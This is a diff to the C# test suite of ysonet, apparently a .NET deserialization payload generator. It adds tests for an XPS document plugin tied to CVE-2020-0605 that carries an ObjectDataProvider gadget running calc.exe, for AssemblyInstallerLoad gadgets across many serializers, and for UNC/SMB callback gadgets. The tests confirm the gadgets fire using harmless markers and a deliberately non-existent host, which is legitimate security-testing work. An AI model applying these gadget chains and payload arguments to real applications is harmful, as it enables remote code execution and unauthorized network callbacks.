+                            markup = reader.ReadToEnd();
+
+                        bool hasGadget = markup.Contains("ObjectDataProvider");
+                        bool shouldHaveGadget = carriesPayload.Contains(part.Key);
+                        AssertTrue(hasGadget == shouldHaveGadget,
+                            "Xps -m " + mode + " part " + part.Key
+                            + (shouldHaveGadget ? " must carry the gadget" : " must NOT carry the gadget"));
+
+                        if (shouldHaveGadget)
+                        {
+                            AssertTrue(markup.Contains("calc.exe"),
+                                "Xps -m " + mode + " part " + part.Key + " carries the command");
+                            // The gadget is embedded as a child element, so a nested XML
+                            // declaration (which XamlWriter emits for a standalone document)
+                            // would make the part malformed.
+                            AssertTrue(markup.IndexOf("<?xml", StringComparison.Ordinal) < 0,
+                                "Xps -m " + mode + " part " + part.Key + " has no embedded XML declaration");
+                        }
+                    }
+                }
+            }
+        }
+
+        // Bad input is reported, not silently turned into a different document.
+        private static void XpsRejectsBadInput()
+        {
+            RunResult badMode = PayloadRunner.RunPlugin("Xps", new[] { "-m", "fdsq", "-c", "calc.exe" });
+            AssertTrue(!badMode.Success, "an unknown part mode fails");
+
+            RunResult noCommand = PayloadRunner.RunPlugin("Xps", new[] { "-m", "fdseq" });
+            AssertTrue(!noCommand.Success, "an empty command fails");
+        }
+
+        // Plugin options live in static fields and the suite runs plugins repeatedly in one
+        // process, so a second run must not inherit the first one's mode or flags.
+        private static void XpsOptionsDoNotLeak()
+        {
+            RunResult all = PayloadRunner.RunPlugin("Xps", new[] { "-m", "all", "-c", "calc.exe" });
+            AssertTrue(all.Success, "Xps -m all runs: " + all.ErrorMessage);
+
+            // No -m this time: it must fall back to the documented default, not stay on "all".
+            RunResult second = PayloadRunner.RunPlugin("Xps", new[] { "-c", "calc.exe" });
+            AssertTrue(second.Success, "Xps without -m runs: " + second.ErrorMessage);
+
+            AssertTrue(Bytes(second.Raw).Length < Bytes(all.Raw).Length,
+                "the second run used the fdseq default, not the leaked 'all' mode");
+        }
+
         // Triggering harness: build each Clipboard delivery payload exactly as the
         // plugin does, then drive the target's deserialization/paste path and prove
         // the command fired (a marker file only a fired gadget could create). This
@@ -5618,7 +6251,7 @@ namespace ysonet.Tests
 
             // Only ever asserted positively, so it gets the full marker budget.
             bool ran = WaitForFile(marker, MarkerWaitMs);
-            if (File.Exists(marker)) File.Delete(marker);
+            SafeDelete(marker);
             return ran;
         }
 
@@ -5647,7 +6280,7 @@ namespace ysonet.Tests
             // longer for something that must never appear only slows the suite). The
             // non-restrictive case must fire, so it gets the full marker budget.
             bool ran = WaitForFile(marker, restrictive ? 2500 : MarkerWaitMs);
-            if (File.Exists(marker)) File.Delete(marker);
+            SafeDelete(marker);
             return ran;
         }
 
@@ -6136,6 +6769,77 @@ namespace ysonet.Tests
             }
         }
 
+        // A gadget whose sink is a property SETTER or a getter chain must never construct its
+        // real target - assigning the property IS the effect - so it hands a SURROGATE graph
+        // with the same member names to MessagePackTypelessTypeSwap and relies on the
+        // type-name cache swap to write the FRAMEWORK name into the stream.
+        //
+        // That swap fails SILENTLY: the payload still generates and is still valid MessagePack,
+        // it just carries a ysonet surrogate name that no target can resolve. Generation
+        // therefore proves nothing, so the emitted bytes are read here. This is also what
+        // guards the surrogate shapes living inside their own gadget class: renaming, moving or
+        // nesting one must not change the name on the wire.
+        //
+        // Only the uncompressed flavour can be read as text. The Lz4 flavour runs the same swap
+        // before compressing, and PictureBox's two Lz4 rows are fired end to end in
+        // PayloadsFireIntoTestSinks.
+        private static void MessagePackTypelessCarriesTargetTypeNames()
+        {
+            var rows = new[]
+            {
+                new object[] { "PictureBox", "http://127.0.0.1:1/y", new[] {
+                    "System.Windows.Forms.PictureBox, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" } },
+                // A relative target-side name: nothing is deserialized here, so no directory is
+                // created, and it keeps a machine-specific path out of the test.
+                new object[] { "FileLogTraceListener", "ysonet_mp_probe_dir", new[] {
+                    "Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" } },
+                // Two names, not three: MessagePack Typeless writes a type name only where the
+                // static type is object (the root, and ObjectInstance). StartInfo is declared as
+                // its own concrete type, so it travels as a bare map and the target resolves it
+                // from the real Process.StartInfo property type.
+                new object[] { "ObjectDataProvider", "calc.exe", new[] {
+                    "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+                    "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" } },
+                new object[] { "GetterSettingsPropertyValue", "calc.exe", new[] {
+                    "System.Configuration.SettingsPropertyValue, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089",
+                    "System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089" } },
+            };
+
+            foreach (object[] row in rows)
+            {
+                string gadget = (string)row[0];
+                string sample = (string)row[1];
+
+                InputArgs plainArgs = new InputArgs();
+                plainArgs.Cmd = sample;
+                RunResult plain = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = gadget,
+                    FormatterName = "MessagePackTypeless",
+                    InputArgs = plainArgs,
+                });
+                AssertTrue(plain.Success, gadget + " MessagePackTypeless generates: " + plain.ErrorMessage);
+
+                string text = Text(plain.Raw);
+                foreach (string expected in (string[])row[2])
+                    AssertTrue(text.IndexOf(expected, StringComparison.Ordinal) >= 0,
+                        gadget + " MessagePackTypeless writes the target type name: " + expected);
+                AssertTrue(text.IndexOf("Surrogate", StringComparison.Ordinal) < 0,
+                    gadget + " MessagePackTypeless leaks no surrogate type name");
+
+                InputArgs lz4Args = new InputArgs();
+                lz4Args.Cmd = sample;
+                RunResult lz4 = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = gadget,
+                    FormatterName = "MessagePackTypelessLz4",
+                    InputArgs = lz4Args,
+                });
+                AssertTrue(lz4.Success && RawLength(lz4.Raw) > 0,
+                    gadget + " MessagePackTypelessLz4 generates: " + lz4.ErrorMessage);
+            }
+        }
+
         // Byte length of a raw payload whether it is a string or a byte[].
         private static int RawLength(object raw)
         {
@@ -6373,6 +7077,10 @@ namespace ysonet.Tests
         // strictly after its second with String.CompareOrdinal (see
         // TypeConfuseDelegateFileOperations), so the sample target path has to sort above
         // both the sample destination ("aa...") and the content fixture's text ("AAA...").
+        // Never resolved, never opened: a UNC sample is target data. The host name is
+        // deliberately one that cannot exist, so a sweep can never call out.
+        private const string SampleUncPath = @"\\ysonet-nonexistent-host\share\payload.dll";
+
         private const string SampleTargetPath = "zz_ysonet_target.txt";
         private const string SampleTargetPathPair = "zz_ysonet_source.txt;aa_ysonet_destination.txt";
 
@@ -6397,6 +7105,9 @@ namespace ysonet.Tests
                 case CommandInputType.FilePath: return csFixture;   // any existing local file
                 case CommandInputType.CsSourceFile: return csFixture;
                 case CommandInputType.DllPath: return dllFixture;
+                // A UNC path is only ever TARGET data, so nothing needs to exist here. The
+                // ".dll" tail keeps it valid for the assembly-loading gadgets too.
+                case CommandInputType.UncPath: return SampleUncPath;
                 case CommandInputType.TargetPath: return SampleTargetPath;
                 case CommandInputType.TargetPathPair: return SampleTargetPathPair;
                 case CommandInputType.TargetPathAndLocalFile:
@@ -6494,6 +7205,7 @@ namespace ysonet.Tests
                 { "ThirdPartyGadgets", new string[] { "-g", "UnmanagedLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" } },
                 { "TransactionManagerReenlist", new string[] { "-c", "calc.exe" } },
                 { "ViewState", new string[] { "--dryrun", "--validationkey", valKey } },
+                { "Xps", new string[] { "-m", "fdseq", "-c", "calc.exe" } },
             };
 
             // Not generated here, each with the reason. Keeping this explicit forces a
@@ -7395,7 +8107,7 @@ namespace ysonet.Tests
             }
             finally
             {
-                if (File.Exists(marker)) File.Delete(marker);
+                SafeDelete(marker);
             }
 
             // The newly bridged consumer must ALSO fire end to end, not just generate:
@@ -7424,7 +8136,7 @@ namespace ysonet.Tests
             }
             finally
             {
-                if (File.Exists(wpMarker)) File.Delete(wpMarker);
+                SafeDelete(wpMarker);
             }
         }
 
@@ -7724,6 +8436,16 @@ namespace ysonet.Tests
                 new PluginCell("ViewState", new[] { "--dryrun", "--validationkey", vk }),
                 new PluginCell("ViewState", new[] { "-g", "TypeConfuseDelegate", "-c", "calc.exe", "--validationkey", vk }).Shrinks(),
                 new PluginCell("ViewState", new[] { "--unsignedpayload", "AAECAwQFBgcICQ==", "--validationkey", vk }),
+
+                // One row per markup part the payload can ride in. Deliberately NOT tagged
+                // .Shrinks(): the output is a deflate-compressed OPC package, so a smaller
+                // inner XAML does not have to make a smaller ZIP. --minify still reaches the
+                // inner ObjectDataProvider (it goes through InputArgs like every other
+                // plugin) and both passes must generate.
+                new PluginCell("Xps", new[] { "-m", "fdseq", "-c", "calc.exe" }),
+                new PluginCell("Xps", new[] { "-m", "fdoc", "-c", "calc.exe" }),
+                new PluginCell("Xps", new[] { "-m", "fpage", "-c", "calc.exe" }),
+                new PluginCell("Xps", new[] { "-m", "all", "-c", "calc.exe" }),
             };
 
             // CVE-2024-38018 needs the bundled SharePoint 2019 DLLs. Include it only when present.
@@ -7896,6 +8618,12 @@ namespace ysonet.Tests
             return "cmd /c echo x > \"" + marker + "\"";
         }
 
+        // Every cleanup of a fire marker must go through this, never a bare File.Delete.
+        // WaitForFile returns as soon as the file EXISTS, and "cmd /c echo x > marker"
+        // creates it before it writes and closes, so a delete right after the wait can
+        // land while the spawned cmd still holds the handle and throws "used by another
+        // process". That is housekeeping failing, not the payload failing, so it must
+        // never fail a test: the startup sweep removes whatever is left behind.
         private static void SafeDelete(string path)
         {
             try { if (path != null && File.Exists(path)) File.Delete(path); } catch { }
@@ -7980,6 +8708,13 @@ namespace ysonet.Tests
                 case "ndc": SerializersHelper.NetDataContractSerializer_deserialize(Text(raw)); break;
                 case "dcs": SerializersHelper.DataContractSerializer_deserialize(Text(raw), null, "root", "type"); break;
                 case "soap": SerializersHelper.SoapFormatter_deserialize(Text(raw)); break;
+                case "jss": SerializersHelper.JavaScriptSerializer_deserialize(Text(raw)); break;
+                case "fastjson": SerializersHelper.FastJson_deserialize(Text(raw)); break;
+                case "yaml": SerializersHelper.YamlDotNet_deserialize(Text(raw)); break;
+                case "ssx": SerializersHelper.SharpSerializer_Xml_deserialize_FromString(Text(raw)); break;
+                case "ssb": SerializersHelper.SharpSerializer_Binary_deserialize_FromByteArray(Bytes(raw)); break;
+                case "mp": SerializersHelper.MessagePackTypeless_deserialize(Bytes(raw), false); break;
+                case "mplz4": SerializersHelper.MessagePackTypeless_deserialize(Bytes(raw), true); break;
                 default: throw new Exception("unknown deserializer tag: " + deserAs);
             }
         }
@@ -8162,6 +8897,83 @@ namespace ysonet.Tests
             }
             catch (Exception ex) { failures.Add("fire plugin " + plugin + ": " + ex.Message); }
             finally { SafeDelete(marker); }
+        }
+
+        // Fire one Xps plugin mode. Both halves of the CVE-2020-0605 gate are asserted:
+        //  1) with the framework switches at their PATCHED defaults the document must parse
+        //     with the gadget dropped, so the marker must NOT appear (an absence assertion,
+        //     so it keeps a short bound like the restrictive clipboard case);
+        //  2) with the legacy switches flipped - what a target that opted out of the
+        //     mitigation looks like - the marker MUST appear.
+        // The switches are process-wide statics and ClipboardPayloadsTrigger asserts that a
+        // restrictive load blocks, so they are restored and the restore is then verified.
+        // A framework predating the mitigation has no switch to flip; that is a capability
+        // the machine genuinely lacks, so it is a logged skip, not a silent pass.
+        private static void FireXpsDocument(string mode, List<string> failures, ref int fired, ref int skipped, bool trace)
+        {
+            bool[] initial;
+            try
+            {
+                initial = SerializersHelper.Xps_get_legacy_switch_state();
+            }
+            catch (NotSupportedException nse)
+            {
+                skipped++;
+                Console.Error.WriteLine("  [skip] fire Xps " + mode + ": " + nse.Message);
+                return;
+            }
+
+            string marker = MarkerPath("plugin_Xps_" + mode);
+            string xpsFile = TestArtifactPath("ysonet_xps_" + mode + ".xps");
+            SafeDelete(marker);
+            SafeDelete(xpsFile);
+            if (trace) { Console.Error.WriteLine("    [fire] plugin Xps -m " + mode); Console.Error.Flush(); }
+
+            bool[] previous = null;
+            try
+            {
+                RunResult r = PayloadRunner.RunPlugin("Xps", new[] { "-m", mode, "-c", MarkerCommand(marker) });
+                if (!r.Success)
+                {
+                    failures.Add("fire Xps " + mode + ": generation failed: " + r.ErrorMessage);
+                    return;
+                }
+                File.WriteAllBytes(xpsFile, Bytes(r.Raw));
+
+                // 1) The patched default must drop the gadget.
+                RunSTA(delegate { SerializersHelper.Xps_load_and_walk(xpsFile); });
+                if (WaitForFile(marker, 2500))
+                {
+                    failures.Add("fire Xps " + mode + ": the gadget ran on the PATCHED default path");
+                    SafeDelete(marker);
+                }
+
+                // 2) A target that opted out of the mitigation must run it.
+                previous = SerializersHelper.Xps_set_legacy_dangerous_mode(true);
+                RunSTA(delegate { SerializersHelper.Xps_load_and_walk(xpsFile); });
+                if (WaitForFile(marker, MarkerWaitMs)) fired++;
+                else failures.Add("fire Xps " + mode + ": marker not created in legacy mode");
+            }
+            catch (Exception ex) { failures.Add("fire Xps " + mode + ": " + ex.Message); }
+            finally
+            {
+                if (previous != null)
+                {
+                    try { SerializersHelper.Xps_restore_legacy_dangerous_mode(previous); }
+                    catch (Exception restoreError)
+                    { failures.Add("fire Xps " + mode + ": could not restore the switches: " + restoreError.Message); }
+                }
+                try
+                {
+                    bool[] after = SerializersHelper.Xps_get_legacy_switch_state();
+                    for (int i = 0; i < after.Length && i < initial.Length; i++)
+                        if (after[i] != initial[i])
+                            failures.Add("fire Xps " + mode + ": left compat switch " + i + " flipped for the rest of the run");
+                }
+                catch { }
+                SafeDelete(marker);
+                SafeDelete(xpsFile);
+            }
         }
 
         // Fire Resx compileddotresources via a ysonet.exe subprocess self-test: it writes a
@@ -8439,6 +9251,12 @@ namespace ysonet.Tests
             FirePluginMarker("ApplicationTrust", new string[0], failures, ref fired, trace);
             FirePluginMarker("TransactionManagerReenlist", new string[0], failures, ref fired, trace);
 
+            // ---- XPS DOCUMENT: open the generated .xps the way a consumer application does,
+            // once on the patched default (must be blocked) and once with the legacy switches
+            // flipped for this process (must fire). Every markup part is covered.
+            foreach (string xpsMode in new[] { "fdseq", "fdoc", "fpage", "all" })
+                FireXpsDocument(xpsMode, failures, ref fired, ref skipped, trace);
+
             // Resx compileddotresources fires via a ResourceSet over the generated .resources
             // file. That read is reliable in a fresh process (it needs ysonet's assembly
             // resolver), so fire it via a subprocess self-test rather than in-process.
@@ -8480,6 +9298,25 @@ namespace ysonet.Tests
             FireDataViewManagerXxe("Xaml", false, false, failures, ref fired, ref skipped, trace);
             FireDataViewManagerXxe("SharpSerializerBinary", false, false, failures, ref fired, ref skipped, trace);
             LegacyXmlChild.Cleanup();
+
+            // ---- INSTALLER MARKER: AssemblyInstallerLoad loads a DLL and constructs its
+            // [RunInstaller(true)] classes. The DLL is the test assembly itself, whose
+            // fixture installer appends one marker line per construction, so every
+            // advertised formatter is fired raw and minified through the PropertyGrid
+            // carrier, and the two formatters that can also build the list carriers are
+            // fired through all four. Each cell also asserts the installer ran exactly once.
+            foreach (string[] row in AssemblyInstallerFireRows)
+            {
+                FireAssemblyInstallerLoad(row[0], row[1], 1, false, failures, ref fired, trace);
+                FireAssemblyInstallerLoad(row[0], row[1], 1, true, failures, ref fired, trace);
+                if (row[0] != "Json.NET" && row[0] != "Xaml")
+                    continue;
+                for (int getter = 2; getter <= 4; getter++)
+                {
+                    FireAssemblyInstallerLoad(row[0], row[1], getter, false, failures, ref fired, trace);
+                    FireAssemblyInstallerLoad(row[0], row[1], getter, true, failures, ref fired, trace);
+                }
+            }
 
             // ObjectDataProvider variant 3 is the xamlurl SSRF variant: it fetches the URL on load.
             FireOdpXamlUrlListener(failures, ref fired, trace);
@@ -8929,6 +9766,99 @@ namespace ysonet.Tests
             finally { SafeDeleteDir(dir); }
         }
 
+        // AssemblyInstallerLoad's effect is the operator's DLL being loaded and its
+        // [RunInstaller(true)] classes constructed. The test-owned DLL is the already-built
+        // ysonet.Tests assembly itself (InstallerFixture.cs), whose installer constructor
+        // appends one line to a marker only when YSONET_INSTALLER_MARKER names one. So the
+        // sink is a marker file this process writes SYNCHRONOUSLY during the deserialize -
+        // no spawned process, so no polling budget is needed.
+        //
+        // The gadget refuses -t, so the payload is generated with Test off and deserialized
+        // here. RunSTA because the WinForms carriers want an STA thread, and because a
+        // carrier can throw AFTER the getter has already run.
+        //
+        // LINE COUNT, not existence: AssemblyInstaller sets its private "initialized" flag
+        // at the end of the first InitializeFromAssembly, so even ComboBox - which reads
+        // HelpText more than once - must construct the installer exactly ONCE. A payload
+        // that ran the operator's code twice would be a real defect.
+        private static void FireAssemblyInstallerLoad(string formatter, string deserAs, int getter,
+            bool minify, List<string> failures, ref int fired, bool trace)
+        {
+            if (RefuseToFireDosGadget("AssemblyInstallerLoad", failures)) return;
+            string label = "AssemblyInstallerLoad " + formatter + " g" + getter + (minify ? " --minify" : "");
+            if (trace) { Console.Error.WriteLine("    [fire] " + label); Console.Error.Flush(); }
+
+            string marker = TestArtifactPath("ysonet_installer_"
+                + formatter.Replace(".", "") + "_g" + getter + (minify ? "_min" : "") + ".txt");
+            SafeDelete(marker);
+            string previous = Environment.GetEnvironmentVariable(YsonetTestInstaller.MarkerVariable);
+            Environment.SetEnvironmentVariable(YsonetTestInstaller.MarkerVariable, marker);
+            try
+            {
+                InputArgs ia = new InputArgs();
+                ia.Cmd = AiFixtureAssemblyPath();
+                ia.Minify = minify;
+                ia.Test = false;   // the gadget refuses -t; the deserialize below is the effect
+                ia.ExtraArguments = new List<string> { "--variant", "1", "--getter", getter.ToString() };
+
+                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = "AssemblyInstallerLoad",
+                    FormatterName = formatter,
+                    OutputFormat = "",
+                    InputArgs = ia,
+                });
+                if (r == null || !r.Success)
+                {
+                    failures.Add("fire " + label + ": generation failed: "
+                        + (r == null ? "no result" : r.ErrorMessage));
+                    return;
+                }
+
+                RunSTA(delegate { DeserializeAs(deserAs, r.Raw); });
+
+                if (!File.Exists(marker))
+                {
+                    failures.Add("fire " + label + ": the installer was never constructed");
+                    return;
+                }
+
+                int runs = 0;
+                foreach (string line in File.ReadAllLines(marker))
+                    if (line.Trim() == YsonetTestInstaller.MarkerLine) runs++;
+
+                if (runs != 1)
+                {
+                    failures.Add("fire " + label + ": the installer ran " + runs
+                        + " times; the AssemblyInstaller 'initialized' flag must limit it to 1");
+                    return;
+                }
+
+                fired++;
+                RuntimeBuild.RecordFired("AssemblyInstallerLoad");
+            }
+            catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
+            finally
+            {
+                Environment.SetEnvironmentVariable(YsonetTestInstaller.MarkerVariable, previous);
+                SafeDelete(marker);
+            }
+        }
+
+        // Gadget formatter -> the deserializer tag DeserializeAs uses for it.
+        private static readonly string[][] AssemblyInstallerFireRows = new string[][]
+        {
+            new string[] { "Json.NET", "json" },
+            new string[] { "Xaml", "xaml" },
+            new string[] { "FastJson", "fastjson" },
+            new string[] { "JavaScriptSerializer", "jss" },
+            new string[] { "YamlDotNet", "yaml" },
+            new string[] { "SharpSerializerXml", "ssx" },
+            new string[] { "SharpSerializerBinary", "ssb" },
+            new string[] { "MessagePackTypeless", "mp" },
+            new string[] { "MessagePackTypelessLz4", "mplz4" },
+        };
+
         private static void FireNetNonRceListener(string gadget, string formatter, List<string> failures, ref int fired, bool trace)
         {
             FireNetNonRceListener(gadget, formatter, false, failures, ref fired, trace);
@@ -9170,14 +10100,29 @@ namespace ysonet.Tests
         // for, so this is only a settling margin.
         private const int OobControlSettleMs = 10000;
 
-        // Gadgets whose whole effect is an outbound UNC/SMB callback, so an out-of-band
-        // interaction is the only honest proof they fire. Columns: gadget name,
-        // formatter, deserializer tag for DeserializeAs. A row whose gadget is not
-        // registered yet logs a skip naming it, so this workflow is ready the day the
-        // gadget lands (see dev-kitchen/ideas/gadget-filesysteminfo-smb-callback.md).
+        // Gadgets that reach a host over UNC/SMB, so an out-of-band interaction is the only
+        // honest proof the target really called out. Columns:
+        //   0 gadget name
+        //   1 formatter
+        //   2 deserializer tag for DeserializeAs
+        //   3 extra CLI arguments, space separated ("" for none)
+        //   4 UNC path shape: "shortname" for the 8.3 expansion trigger
+        //     (\\host\share\aaaaaa~1\x), "dll" for a loadable assembly path
+        //     (\\host\share\payload.dll)
+        // A row whose gadget is not registered yet logs a skip naming it, so this workflow
+        // is ready the day the gadget lands (see
+        // dev-kitchen/ideas/gadget-filesysteminfo-smb-callback.md).
+        //
+        // What a hit proves and what it does not: a DNS query for the run-unique host proves
+        // the target ATTEMPTED the callback. It is not proof of a completed SMB session, of
+        // NTLM authentication, or - for AssemblyInstallerLoad - of a successfully loaded
+        // remote assembly, which additionally needs the share in a zone the target trusts.
         private static readonly string[][] UncCallbackRows = new string[][]
         {
-            new string[] { "FileSystemInfo", "BinaryFormatter", "bf" },
+            new string[] { "FileSystemInfo", "BinaryFormatter", "bf", "", "shortname" },
+            // Variant 2 is the UNC variant, and the path has to end in .dll because the
+            // gadget refuses anything else (Assembly.LoadFrom is the sink).
+            new string[] { "AssemblyInstallerLoad", "Json.NET", "json", "--variant 2", "dll" },
         };
 
         // Prove the observation mechanism and the trigger shape in one run, with a
@@ -9236,7 +10181,8 @@ namespace ysonet.Tests
                         Console.Error.WriteLine("  [skip] fire " + row[0] + ": gadget is not registered yet");
                         continue;
                     }
-                    FireUncCallbackGadget(oob, row[0], row[1], row[2], failures, ref fired, trace);
+                    FireUncCallbackGadget(oob, row[0], row[1], row[2], row[3], row[4],
+                        failures, ref fired, trace);
                 }
             }
             Console.Error.WriteLine("  [oob] gadgets observed: " + fired + ", skipped: " + skipped);
@@ -9247,17 +10193,20 @@ namespace ysonet.Tests
         // Generate a UNC-callback gadget's payload pointed at a run-unique host under the
         // OOB domain, deserialize it in process, and wait for the interaction.
         private static void FireUncCallbackGadget(OobSession oob, string gadget, string formatter,
-            string deserAs, List<string> failures, ref int fired, bool trace)
+            string deserAs, string extraArgs, string pathShape, List<string> failures, ref int fired, bool trace)
         {
             if (RefuseToFireDosGadget(gadget, failures)) return;
             string label = oob.NewLabel(gadget.ToLowerInvariant());
-            string uncPath = oob.ShortNameUncPath(label);
+            string uncPath = pathShape == "dll" ? oob.UncDllPath(label) : oob.ShortNameUncPath(label);
             if (trace) { Console.Error.WriteLine("    [fire] " + gadget + " -> " + uncPath); Console.Error.Flush(); }
             try
             {
                 InputArgs ia = new InputArgs();
                 ia.Cmd = uncPath;
                 ia.Test = false; // the gadget's own self-test must not make THIS machine call out
+                if (!string.IsNullOrEmpty(extraArgs))
+                    ia.ExtraArguments = new List<string>(
+                        extraArgs.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries));
                 RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                 {
                     GadgetName = gadget,
